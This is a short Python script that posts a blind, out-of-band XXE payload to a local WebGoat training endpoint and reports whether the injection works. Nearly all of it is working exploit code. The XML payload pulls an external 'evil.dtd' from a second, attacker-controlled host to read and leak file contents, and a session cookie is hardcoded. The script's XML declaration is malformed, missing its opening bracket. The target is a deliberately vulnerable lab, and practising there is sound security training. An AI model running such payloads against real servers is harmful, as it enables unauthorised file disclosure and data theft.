import requests
import time


url = "http://127.0.0.1:8080/WebGoat/xxe/blind"



def oob_xxe(site):
    is_vulnerable = False
    headers = {'Content-Type': 'application/xml'}
    cookies = {'JSESSIONID': 'IKVlpQTrM_3iYa5VyGWV7jbSV_NdrRKjndHrzcd7'}
    payload = '''
    ?xml version="1.0" encoding="utf-8"?>
   <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://localhost:9090/files/xxexxe/evil.dtd" >%remote;
    ]>
<comment>
<text>&file;</text></comment>
    '''
    response = requests.post(url, headers=headers, data=payload, cookies=cookies)
    if (response.text.find("root") != -1) :
        print("xxe is possible!")
        is_vulnerable = True
    print(response.text)
    return is_vulnerable

if __name__ == "__main__":
    oob_xxe(url)
